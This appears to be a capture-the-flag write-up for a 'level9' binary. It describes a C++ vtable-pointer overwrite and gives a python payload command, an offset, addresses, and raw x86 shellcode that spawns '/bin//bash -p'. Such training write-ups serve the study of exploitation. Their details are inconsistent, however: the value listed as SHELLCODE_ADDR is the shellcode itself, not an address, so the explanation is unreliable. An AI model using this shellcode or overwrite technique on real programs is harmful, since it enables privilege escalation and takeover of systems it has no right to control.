## LEVEL 9 HELP

the level9 binary make a c++ `vtable` call to an unimplemented function.

it means that the program will try to read the function address from the `vtable` pointer stored in the object instance.

then we need to overwrite the `vtable` pointer to point to a fake `vtable` that we control.

### USAGE

```bash
./level9 [input]
```

### SOLUTION
To solve this level, you can use the following python command to create the payload and run the binary:

```bash
./level9 $(python -c 'print("[VTABLE_ADDR]" + "[SHELLCODE_ADDR]" + "a" * [OFFSET] + "[FAKE_VTABLE_ADDR]")') 
```

### COMMAND EXPLANATION
- `[VTABLE_ADDR]` : replace this with the address of the `vtable` pointer in little endian format (you can find it using gdb or objdump)

- `[SHELLCODE_ADDR]` : replace this with the address where the shellcode will be located in little endian format

- `a * OFFSET` : padding to reach the position of the `vtable` pointer

- `[FAKE_VTABLE_ADDR]` : replace this with the address of the fake `vtable` in little endian format, which contains the address of the shellcode

### USED parameters

`VTABLE_ADDR` = `\x10\xa0\x04\x08`

`SHELLCODE_ADDR` = `\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80`

`OFFSET` = `71`

`FAKE_VTABLE_ADDR` = `\x0c\xa0\x04\x08`